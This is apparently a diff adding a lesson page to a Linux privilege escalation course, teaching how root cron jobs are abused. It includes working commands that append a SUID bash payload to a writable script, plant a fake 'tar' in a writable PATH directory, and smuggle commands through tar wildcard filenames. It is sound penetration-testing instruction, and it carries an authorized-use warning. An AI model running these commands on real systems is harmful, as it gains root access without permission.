@@ -1,0 +1,117 @@
+---
+title: Cron Jobs and PATH Abuse
+module: linux-privilege-escalation
+moduleTitle: Linux Privilege Escalation
+moduleOrder: 18
+moduleIcon: ArrowUpFromLine
+order: 3
+summary: Root runs a script you can write. That is the whole game.
+estimatedMinutes: 17
+objectives:
+  - Enumerate cron jobs and find ones that run as root
+  - Exploit a writable script or a writable PATH directory a cron uses
+  - Recognize wildcard injection in cron backup jobs
+tags:
+  - privesc
+  - cron
+  - path
+  - wildcards
+---
+
+Admins automate cleanup and backups with cron, and they write those scripts fast
+and loose because "only root runs them." That assumption is the bug. If a job
+runs as root every minute and you can change what it executes, root runs your
+code on a timer. You do not attack the cron system, you attack the sloppy script
+behind it.
+
+## Find the jobs
+
+Cron entries live in a few predictable places. Read all of them. The system
+crontab and the drop-in directories are where root's scheduled jobs sit.
+
+<CommandBlock
+  title="user@target"
+  commands={[
+    { cmd: "cat /etc/crontab", comment: "system-wide jobs, note the user column" },
+    { cmd: "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/", comment: "drop-in scripts" },
+    { cmd: "cat /etc/cron.d/*", comment: "read the actual commands they run" },
+  ]}
+/>
+
+You are hunting for a job that runs as root and calls a script or binary you can
+modify. Check the permissions on every path a root cron touches.
+
+## Case one: the script is writable
+
+If root runs `/opt/backup.sh` every five minutes and that file is world-writable,
+you win. Append a payload and wait for the next run.
+
+<CommandBlock
+  title="user@target"
+  commands={[
+    { cmd: "ls -la /opt/backup.sh", comment: "check who can write it" },
+    { cmd: "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh", comment: "drop a SUID bash copy" },
+    { cmd: "/tmp/rootbash -p", comment: "after the cron fires: -p keeps root privileges" },
+  ]}
+/>
+
+## Case two: PATH hijacking
+
+Sometimes the script itself is not writable, but it calls a program by bare name,
+like `backup` or `tar`, instead of a full path. Cron resolves that name through
+its PATH. If PATH lists a directory you can write to before the real location,
+your fake binary runs first.
+
+Look at the top of `/etc/crontab`. If it sets `PATH=/home/user/bin:/usr/bin` and
+you own `/home/user/bin`, plant a malicious `tar` there and the root cron calls
+yours.
+
+<CommandBlock
+  title="user@target"
+  commands={[
+    { cmd: "printf '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/bin/tar", comment: "fake tar earlier in PATH" },
+    { cmd: "chmod +x /home/user/bin/tar", comment: "make it executable" },
+  ]}
+/>
+
+## Case three: wildcard injection
+
+A backup job like `tar czf /backup.tar.gz *` run from a directory you can write to
+is exploitable. `tar` treats filenames that start with a hyphen as options, so you
+create files named after `tar`'s checkpoint flags and it executes your command.
+
+<CommandBlock
+  title="user@target"
+  commands={[
+    { cmd: "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh", comment: "your payload" },
+    { cmd: "touch -- '--checkpoint=1'", comment: "these become tar options via the wildcard" },
+    { cmd: "touch -- '--checkpoint-action=exec=sh shell.sh'", comment: "tar runs shell.sh as root" },
+  ]}
+/>
+
+<Callout type="tip" title="Can't read the crontab? Use pspy">
+Unprivileged users often cannot see root's crontab, but you can still watch
+processes as they spawn. `pspy` needs no root and prints every command and cron
+job the moment it fires, so you catch the job even when the file is hidden.
+</Callout>
+
+<Callout type="security" title="Authorized systems only">
+Planting payloads in cron paths modifies the target and runs code as root. Do it
+only on machines you own or are contracted to test, and clean up your artifacts
+(the rootbash copy, the fake binary) when you are done.
+</Callout>
+
+<Quiz
+  id="path-hijack"
+  question="A root cron script calls `backup` with no full path, and PATH starts with a directory you can write to. What do you do?"
+  answer={0}
+  options={[
+    "Place an executable named backup in your writable PATH directory so cron runs it as root",
+    "Rename the real backup binary",
+    "Change the cron schedule to run more often",
+    "Wait for the admin to fix PATH",
+  ]}
+  explanation="Cron resolves the bare name through PATH. A malicious `backup` earlier in PATH runs before the real one, as root."
+/>
+
+<Notes />
